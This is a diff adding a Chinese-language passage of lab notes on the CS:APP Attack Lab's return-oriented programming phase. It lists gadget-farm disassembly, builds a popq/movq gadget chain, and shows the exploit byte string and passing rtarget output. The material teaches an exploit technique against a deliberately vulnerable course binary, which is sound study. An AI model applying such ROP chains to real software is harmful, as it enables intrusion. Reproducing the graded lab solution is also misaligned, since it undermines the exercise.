@@ -256,3 +256,114 @@ PASS: Would have posted the following:
 	lab	attacklab
 	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61
 ```
+
+##  Part II: Return-Oriented Programming
+
+采用以下两种技术对抗**漏洞利用**字符串技术：
+
+- 随机化。每次运行时栈位置不同，导致无法注入代码。
+- 将保存栈的区域设置为不可执行，设置权限保护。
+
+**ROP技术**使用现有代码中的二进制指令序列使其组合成一系列读写内存、算术运算等操作，构造一段代码链来实现攻击。
+
+### Level2
+
+对于阶段4，你将需要重复阶段2的攻击，但是是在`RTARGET`程序中使用`gadget`完成。你可以使用以下指令组成的`gadget`来构造解决方案。
+
+- movq
+- popq
+- ret：编码为单字节0xc3。
+- nop：无操作，被编码为单字节0x90。会使程序计数器加1。
+
+![](https://s3.ax1x.com/2021/01/03/s97OFe.png)
+
+![](https://s3.ax1x.com/2021/01/03/s97jWd.png)
+
+![](https://s3.ax1x.com/2021/01/03/s9HCef.png)
+
+使用`objdump -d rtarget > rtarget.txt`命令后在反汇编代码的`start_farm`和`mid_farm`中构造`gadget`。
+
+```assembly
+0000000000401994 <start_farm>:
+  401994:	b8 01 00 00 00       	mov    $0x1,%eax
+  401999:	c3                   	retq   
+
+000000000040199a <getval_142>:
+  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
+  40199f:	c3                   	retq   
+
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq   
+
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+
+00000000004019ae <setval_237>:
+  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
+  4019b4:	c3                   	retq   
+
+00000000004019b5 <setval_424>:
+  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
+  4019bb:	c3                   	retq   
+
+00000000004019bc <setval_470>:
+  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
+  4019c2:	c3                   	retq   
+
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq   
+
+00000000004019ca <getval_280>:
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3                   	retq   
+
+00000000004019d0 <mid_farm>:
+  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
+  4019d5:	c3                   	retq
+```
+
+我们的任务是从`getbuf`函数返回执行`touch2`函数，将`cookie`参数传递给`touch2`。故需要将`cookie`传给`%rdi`寄存器。
+
+我们可以构造以下汇编代码：
+
+```assembly
+popq %rax # 58
+retq # c3
+movq %rax,%rdi # 48 89 c7
+retq # c3
+```
+
+利用给的指令字节码表我们可以找到对应的字节码。在给定范围的汇编代码中找到相应的连续字节码构造`gadget`。
+
+我们可以得到字节系列。
+
+```bash
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00 # popq指令的地址
+fa 97 b9 59 00 00 00 00 # cookie的值
+a2 19 40 00 00 00 00 00 # movq指令的地址
+ec 17 40 00 00 00 00 00 # touch2的地址
+```
+
+也就是在`getbuf`函数执行完后首先跳到`0x4019ab`地址执行`popq`指令将`cookie`的值赋给`%rax`寄存器，然后执行`c3 retq`跳转到`0x4019a2`地址执行`movq`指令，最后跳转到`0x4017ec`的`touch2`函数。
+
+```bash
+root@5139ac651595:/csapp/target1# ./hex2raw < attack4.txt > attackraw4.txt
+root@5139ac651595:/csapp/target1# ./rtarget -q -i attackraw4.txt
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
+```
+
